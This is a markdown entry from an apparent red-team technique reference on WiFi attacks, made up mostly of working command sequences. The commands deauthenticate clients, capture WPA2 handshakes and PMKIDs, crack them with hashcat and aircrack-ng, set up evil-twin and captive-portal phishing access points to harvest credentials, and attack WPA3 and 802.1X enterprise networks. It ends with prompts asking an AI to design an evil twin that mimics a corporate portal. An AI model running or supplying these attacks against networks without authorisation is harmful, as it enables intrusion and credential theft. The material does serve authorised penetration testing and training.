---
id: "wireless-attacks"
title: "Wireless Network Attacks - WiFi Penetration Testing"
type: "technique"
category: "network"
subcategory: "wireless"
tags: ["wifi", "wireless", "wpa", "wpa2", "wpa3", "evil-twin", "deauth", "handshake", "deep-dig"]
difficulty: "advanced"
platforms: ["linux"]
related: ["port-scanning-methodology", "social-engineering"]
updated: "2026-03-30"
---

## Overview

Wireless penetration testing targets WiFi networks, Bluetooth, and other RF protocols. WiFi attacks remain a critical entry point for red teams, providing network access without physical connection. Modern attacks focus on WPA2/WPA3 bypasses, evil twin access points, and client-side attacks.

## WiFi Reconnaissance

```bash
# Enable monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Target specific network (capture handshake)
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon

# Deauthentication attack (force handshake)
aireplay-ng -0 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
```

## WPA2 Attacks

### Handshake Capture + Crack
```bash
# Capture the 4-way handshake (via deauth)
airodump-ng -c CH --bssid BSSID -w handshake wlan0mon
aireplay-ng -0 3 -a BSSID wlan0mon

# Crack with hashcat (GPU-accelerated)
hcxpcapngtool handshake-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Crack with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
```

### PMKID Attack (No Client Needed)
```bash
# Capture PMKID from AP (no deauth required)
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o pmkid.hc22000
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

## Evil Twin / Rogue AP

```bash
# Create evil twin with hostapd-mana
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf

# Automated evil twin with eaphammer
eaphammer --bssid TARGET_BSSID --essid "CorpWiFi" --channel 6 --interface wlan0 --creds

# Captive portal phishing
wifiphisher -i wlan0 -e "Company WiFi" -p firmware-upgrade
```

## WPA3 / 802.1X Attacks

### Dragonfly Handshake Attacks
```bash
# Dragonblood attack against WPA3-SAE
# Side-channel timing attack to recover password
dragonslayer -i wlan0mon -t TARGET_BSSID

# Downgrade attack (force WPA2 transition mode)
# Many APs support WPA2/WPA3 mixed mode
```

### Enterprise (802.1X) Attacks
```bash
# Evil twin for EAP credential capture
eaphammer --bssid TARGET --essid CorpWiFi --channel 6 --interface wlan0 --auth wpa-eap --creds

# RADIUS credential relay
hostapd-mana with EAP relay to capture NTLM/MSCHAPv2 hashes
```

## Deep Dig Prompts

```
Given this wireless environment [describe networks, encryption, clients]:
1. Rank attack vectors by success probability and stealth.
2. Design an evil twin attack that mimics the corporate captive portal.
3. Suggest client-side attacks for devices that auto-connect to known SSIDs.
4. If WPA3 is in use, identify downgrade or implementation weaknesses.
```

## Tools

- **Aircrack-ng Suite** — Monitor mode, packet injection, WPA cracking
- **Hashcat** — GPU-accelerated password cracking
- **hcxdumptool/hcxtools** — PMKID capture and conversion
- **Hostapd-mana** — Rogue AP with credential capture
- **EAPHammer** — Enterprise WiFi attacks
- **Wifiphisher** — Automated phishing via evil twin
- **Bettercap** — Network attack framework with WiFi modules
- **Kismet** — Wireless network detector and sniffer
